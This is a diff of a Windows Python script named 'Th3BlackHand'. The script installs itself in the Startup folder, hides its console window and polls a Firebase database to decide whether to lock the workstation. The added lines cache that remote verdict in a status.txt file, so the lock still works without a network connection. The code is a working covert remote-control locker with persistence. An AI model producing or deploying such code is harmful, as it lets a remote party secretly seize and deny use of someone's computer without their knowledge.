@@ -11,6 +11,10 @@ bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\S
 with open(bat_path + '\\' + "Th3BlackHand.bat", "w+") as bat_file:
     bat_file.write(r'start "" %s' % file_path)
 
+f = open(bat_path + '\\' + "status.txt", "w")
+f.write("")
+f.close()
+
 CMD = ctypes.windll.kernel32.GetConsoleWindow()      
 if CMD != 0:      
     ctypes.windll.user32.ShowWindow(CMD, 0)      
@@ -27,10 +31,23 @@ while True:
         firebase = firebase.FirebaseApplication("https://test-ed516.firebaseio.com/", None) # Change the firebase url to yours !
         Value = firebase.get('/status/what/', None) # Change the firebase realtime database paths accordingly !!
         if "True" == Value:
+            f = open(bat_path + '\\' + "status.txt", "w")
+            f.write("True")
+            f.close()
             print("You Are Allowed :)")
         elif "False" == Value:
+            f = open(bat_path + '\\' + "status.txt", "w")
+            f.write("False")
+            f.close()
             ctypes.windll.user32.LockWorkStation()
             print("Not Allowed! :(")
     except OSError:
         print("Internet Connection -> !OK")
-    
+        f = open(bat_path + '\\' + "status.txt", "r")
+        Status = f.read()
+        if "True" == Status:
+            print("allowed")
+        elif "False" == Status:
+            ctypes.windll.user32.LockWorkStation()
+            print("Not Allowed! :(")
+        f.close()
